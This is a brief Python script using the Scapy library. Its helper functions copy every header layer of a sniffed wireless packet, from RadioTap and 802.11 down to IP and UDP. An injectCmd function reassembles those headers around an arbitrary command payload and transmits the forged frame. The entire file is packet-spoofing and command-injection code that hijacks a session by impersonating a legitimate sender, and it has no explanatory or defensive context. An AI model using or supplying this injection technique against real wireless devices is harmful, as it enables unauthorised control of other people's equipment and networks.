#!/usr/bin/python3
from scapy.all import *

def duplicate_Radio(pkt):
    rpkt = pkt.getlayer(RadioTap)
    version = rpkt.version
    pad = rpkt.pad
    present = rpkt.present
    notdecoded = rpkt.notdecoded
    npkt = RadioTap(version=version,pad=pad,present=present,notdecoded=notdecoded)
    return npkt


def duplicate_Dot11(pkt):
    dpkt = pkt.getlayer(Dot11)
    subType = dpkt.subtype
    Type= dpkt.type
    proto = dpkt.proto
    FCfield = dpkt.FCfield
    ID = dpkt.ID
    addr1 = dpkt.addr1
    addr2 = dpkt.addr2
    addr3 = dpkt.addr3
    SC = dpkt.SC
    addr4 = dpkt.addr4
    npkt = Dot11(subtype=subType,type=Type,proto=proto,FCfield=FCfield,ID=ID,addr1=addr1,addr2=addr2,addr3=addr3,SC=SC,addr4=addr4)
    return npkt

def duplicate_Snap(pkt):
    sPkt = pkt.getlayer(SNAP)
    oui = sPkt.OUI 
    code = sPkt.code
    npkt = SNAP(OUI=oui,code=code)
    return npkt

def duplicate_LLC(pkt):
    lpkt = pkt.getlayer(LLC)
    dsap = lpkt.dsap
    ssap = lpkt.ssap
    ctrl = lpkt.ctrl
    npkt = LLC(dsap = dsap,ssap=ssap,ctrl=ctrl)
    return npkt

def duplicate_IP(pkt):
    ipkt = pkt.getlayer(IP)
    version = ipkt.version
    tos = ipkt.tos
    ID = ipkt.id
    flags = ipkt.flags
    ttl = ipkt.ttl
    proto = ipkt.proto
    src = ipkt.src
    dst = ipkt.dst
    options = ipkt.options
    npkt = IP(version=version,tos=tos,id=ID,flags=flags,ttl=ttl,proto=proto,src=src,dst=dst,options=options)
    return npkt


def duplicate_UDP(pkt):
    upkt = pkt.getlayer(UDP)
    sport = upkt.sport
    dport = upkt.dport
    npkt = UDP(sport=sport,dport=dport)
    return npkt

def injectCmd(pkt,cmd):
    radio = duplicate_Radio(pkt)
    dot11 = duplicate_Dot11(pkt)
    snap = duplicate_Snap(pkt)
    llc = duplicate_LLC(pkt)
    ip = duplicate_IP(pkt)
    udp = duplicate_UDP(pkt)
    raw = Raw(load=cmd)
    injectPkt = radio/dot11/snap/llc/ip/udp/raw
    sendp(injectPkt)